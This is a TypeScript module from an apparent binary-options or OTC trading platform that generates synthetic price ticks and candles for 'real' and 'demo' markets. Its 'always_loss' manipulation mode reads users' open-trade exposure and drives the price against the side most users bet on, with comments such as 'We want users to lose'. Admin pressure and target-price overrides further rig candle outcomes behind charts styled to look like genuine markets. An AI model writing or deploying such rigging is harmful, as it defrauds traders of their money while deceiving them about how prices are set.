import { 
  markets_real, markets_demo, 
  history_real, history_demo, 
  currentCandles_real, currentCandles_demo,
  saveCandleToDB_v2, TIMEFRAMES, timeframeSecondsMap
} from './marketService.ts';
import { getIO } from './socketService.ts';
import { tradeExposureCache } from './tradeService.ts';

const pairStates = new Map<string, {
  trend: number;
  trendDuration: number;
  volatilityMultiplier: number;
  lastTickTime: number;
  momentum: number;
  newsEvent?: {
    intensity: number;
    duration: number;
    direction: number;
  };
}>();

import { globalManipulationMode } from './marketService.ts';

export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
  const pool = type === 'real' ? markets_real : markets_demo;
  const historyPool = type === 'real' ? history_real : history_demo;
  const candlePool = type === 'real' ? currentCandles_real : currentCandles_demo;
  
  const m = pool[pair];
  if (!m) return null;

  const stateKey = `${pair}_${type}`;
  let state = pairStates.get(stateKey);
  if (!state) {
    state = {
      trend: 0,
      trendDuration: 0,
      volatilityMultiplier: 1,
      lastTickTime: Date.now(),
      momentum: 0
    };
    pairStates.set(stateKey, state);
  }

  // 1. Calculate Time Step (dt)
  const nowMs = Date.now();
  let dt = (nowMs - state.lastTickTime) / 1000;
  if (dt <= 0) dt = 0.05; // default to 50ms
  if (dt > 1) dt = 0.05;
  state.lastTickTime = nowMs;

  // 2. Trend & Momentum Management
  state.trendDuration -= (dt * 1000);
  
  // Handle News Events
  if (state.newsEvent) {
    state.newsEvent.duration -= (dt * 1000);
    if (state.newsEvent.duration <= 0) {
      state.newsEvent = undefined;
    }
  } else if (m.newsTrigger) {
    state.newsEvent = m.newsTrigger;
    m.newsTrigger = null; // Consume the trigger
    console.log(`📡 Manual News Event on ${pair} (${type})! Direction: ${state.newsEvent.direction}`);
  }

  if (state.trendDuration <= 0) {
    state.trendDuration = 5000 + Math.random() * 15000; // Shorter trends: 5-20s for more "active" charts
    
    let trendPower = (Math.random() - 0.5) * 2;
    
    // Respect Admin Trend Settings
    if (m.trend === 'up') trendPower = Math.abs(trendPower) + 0.5;
    else if (m.trend === 'down') trendPower = -Math.abs(trendPower) - 0.5;
    
    // Slightly stronger base trend for visual impact
    state.trend = trendPower * 0.0018; 
    state.volatilityMultiplier = 1.5 + Math.random() * 1.0; // Higher base volatility
  }

  // 3. GEOMETRIC BROWNIAN MOTION (GBM) CALCULATION with News & Manipulation
  const currentPrice = Number(m.price) || 100;
  
  let baseSigma = Number(m.volatility) || 0.0002;
  // Always convert absolute volatility to relative volatility for GBM
  baseSigma = baseSigma / currentPrice;

  // Professional charts have significant noise even in trends
  let volatilityMultiplier = state.volatilityMultiplier || 1.5;
  if (m.targetPrice === null) {
      volatilityMultiplier *= (type === 'real' ? 2.5 : 2.2); 
  }

  let sigma = baseSigma * volatilityMultiplier;
  let mu = state.trend || 0;

  // Apply Admin Pressure (Manual override for candle outcome)
  if (m.pressure && Math.abs(m.pressure) > 0) {
    mu += (m.pressure / 100) * 0.015; // Strong bias based on pressure
    sigma *= (1 - Math.abs(m.pressure) / 200); // Reduce randomness slightly when under high pressure
  }
  
  // Apply Global Manipulation Mode
  if (globalManipulationMode !== 'neutral') {
    const exposureKey = `${pair}_${type}`;
    const exposure = tradeExposureCache.get(exposureKey) || 0;
    
    // exposure > 0 means UP trades dominate. exposure < 0 means DOWN trades dominate.
    if (exposure !== 0) {
      let biasDirection = 0;
      
      if (globalManipulationMode === 'always_loss') {
        // We want users to lose. If they bet UP (exposure > 0), we move DOWN (-1).
        biasDirection = exposure > 0 ? -1 : 1;
      } else if (globalManipulationMode === 'always_win') {
        // We want users to win. If they bet UP, we move UP (1).
        biasDirection = exposure > 0 ? 1 : -1;
      }
      
      // Apply extreme drift based on mode
      const manipulationStrength = 0.05; // Extremely strong drift to ensure the candle goes in the right direction
      mu += biasDirection * manipulationStrength;
      
      // Optionally reduce randomness so it doesn't accidentally spike against us
      sigma *= 0.5; 
    }
  }

  // Apply news intensity
  if (state.newsEvent) {
    sigma *= (state.newsEvent.intensity || 1.5);
    mu += (state.newsEvent.direction || 1) * 0.004 * (state.newsEvent.intensity || 1);
  }
  
  // Target Price Smoothing
  let targetDrift = 0;
  if (m.targetPrice && currentPrice > 0 && Math.abs(m.targetPrice - currentPrice) > (currentPrice * 0.000001)) {
    const rawDrift = (Number(m.targetPrice) - currentPrice) / currentPrice;
    targetDrift = (rawDrift / 3.0) * dt; // Drift faster to target (3s)
  } else if (m.targetPrice === null) {
      const driftMultiplier = type === 'real' ? 0.0002 : 0.0001;
      targetDrift = (Math.random() - 0.5) * driftMultiplier * dt;
  }
  
  // Random Walk Component (Shock)
  const u1 = Math.random() || 0.0001; 
  const u2 = Math.random();
  const dW = Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2) * Math.sqrt(dt);
  
  // Momentum Factor: Add short-term auto-correlation
  // If price moved up last tick, it has a 30% bias to continue or reverse slightly
  const momentumEffect = state.momentum * 0.15;
  
  const drift = (mu - 0.5 * Math.pow(sigma, 2)) * dt + targetDrift + momentumEffect;
  const shock = sigma * dW;
  
  // Add "Micro-Oscillations" for realistic "flicker" on 5s candles
  const flicker = (Math.random() - 0.5) * sigma * 0.8; // Increased flicker
  
  const priceMultiplier = Math.exp(drift + shock + flicker);
  const newPrice = currentPrice * priceMultiplier;
  
  // Update state momentum for next tick
  state.momentum = (newPrice - currentPrice) / currentPrice;

  // Final safety check
  if (isNaN(newPrice) || !isFinite(newPrice) || newPrice <= 0) {
    m.price = currentPrice;
  } else {
    m.price = newPrice;
  }

  if (m.targetPrice && Math.abs(m.targetPrice - m.price) < (m.price * 0.00005)) {
    m.targetPrice = null;
  }

  // 4. Update all timeframes
  for (const tf of TIMEFRAMES) {
    const tfSeconds = timeframeSecondsMap[tf];
    const bucketTime = now - (now % tfSeconds);
    const activeCandle = candlePool[pair]?.[tf];

    if (!activeCandle) {
      if (!candlePool[pair]) candlePool[pair] = {};
      candlePool[pair][tf] = {
        open: m.price,
        high: m.price,
        low: m.price,
        close: m.price,
        volume: Math.random() * 5,
        openTime: bucketTime,
        closeTime: bucketTime + tfSeconds
      };
      saveCandleToDB_v2(pair, type, tf, candlePool[pair][tf]);
    } else if (bucketTime > activeCandle.openTime) {
      // ACTIVE CANDLE COMPLETED!
      const completedCandle = { ...activeCandle };

      // 1. Save completed candle permanently to database
      saveCandleToDB_v2(pair, type, tf, completedCandle);

      // 2. Push to local history cache
      if (!historyPool[pair]) historyPool[pair] = {};
      if (!historyPool[pair][tf]) historyPool[pair][tf] = [];
      const historyRow = {
        time: completedCandle.openTime,
        open: completedCandle.open,
        high: completedCandle.high,
        low: completedCandle.low,
        close: completedCandle.close,
        volume: completedCandle.volume,
        openTime: completedCandle.openTime,
        closeTime: completedCandle.closeTime
      };
      historyPool[pair][tf].push(historyRow);
      if (historyPool[pair][tf].length > 25000) historyPool[pair][tf].shift();

      // 3. Prevent gaps: Fill any gaps between completed candle and current bucketTime
      let gapTime = completedCandle.closeTime;
      let runtimeGapCount = 0;
      while (gapTime < bucketTime && runtimeGapCount < 100) {
        const gapCandle = {
          open: completedCandle.close,
          high: completedCandle.close,
          low: completedCandle.close,
          close: completedCandle.close,
          volume: 0,
          openTime: gapTime,
          closeTime: gapTime + tfSeconds
        };

        saveCandleToDB_v2(pair, type, tf, gapCandle);

        const gapRow = {
          time: gapCandle.openTime,
          open: gapCandle.open,
          high: gapCandle.high,
          low: gapCandle.low,
          close: gapCandle.close,
          volume: gapCandle.volume,
          openTime: gapCandle.openTime,
          closeTime: gapCandle.closeTime
        };

        historyPool[pair][tf].push(gapRow);
        if (historyPool[pair][tf].length > 25000) historyPool[pair][tf].shift();

        // Emit complete for gaps too so users stay sync'd
        try {
           getIO().to(`market_${pair}_${type}`).emit('candle_complete', { pair, timeframe: tf, candle: gapRow });
        } catch(e) {
           // IO might not be initialized
        }

        gapTime += tfSeconds;
        runtimeGapCount++;
      }

      // 4. Emit completed candle to Socket.IO clients in proper format { pair, timeframe, candle }
      try {
         getIO().to(`market_${pair}_${type}`).emit('candle_complete', { pair, timeframe: tf, candle: historyRow });
      } catch(e) {
         // IO might not be initialized
      }

      // 5. Create new forming candle
      let nextOpen = completedCandle.close;
      
      // Simulate occasional gap-up/gap-down for realism (OTC markets have micro-gaps)
      if (tf === '5 seconds' && Math.random() < 0.15) { 
         const gapSize = nextOpen * baseSigma * (Math.random() * 1.5 + 0.5); 
         nextOpen += (Math.random() > 0.5 ? gapSize : -gapSize);
         m.price = nextOpen; // immediately snap market price to gap
      }

      candlePool[pair][tf] = {
        open: nextOpen,
        high: Math.max(nextOpen, m.price),
        low: Math.min(nextOpen, m.price),
        close: m.price,
        volume: Math.random() * 5,
        openTime: bucketTime,
        closeTime: bucketTime + tfSeconds,
        lastSaved: Date.now() // Track when we last saved this candle to DB
      };
      saveCandleToDB_v2(pair, type, tf, candlePool[pair][tf]);
    } else {
      // Still in the same candle: update high, low, close, and volume
      activeCandle.close = m.price;
      activeCandle.high = Math.max(activeCandle.high, m.price);
      activeCandle.low = Math.min(activeCandle.low, m.price);
      activeCandle.volume += Math.random() * 2;

      // ONLY save to DB periodically (every 5 seconds) to prevent overwhelming the database
      // Completed candles are always saved above.
      const nowMs = Date.now();
      if (!activeCandle.lastSaved || (nowMs - activeCandle.lastSaved) > 5000) {
        activeCandle.lastSaved = nowMs;
        saveCandleToDB_v2(pair, type, tf, activeCandle);
      }
    }
  }

  const active5sCandle = candlePool[pair]?.["5 seconds"];

  return {
    price: m.price,
    time: now,
    candle: active5sCandle ? {
      time: active5sCandle.openTime,
      open: active5sCandle.open,
      high: active5sCandle.high,
      low: active5sCandle.low,
      close: active5sCandle.close,
      volume: active5sCandle.volume
    } : null
  };
}
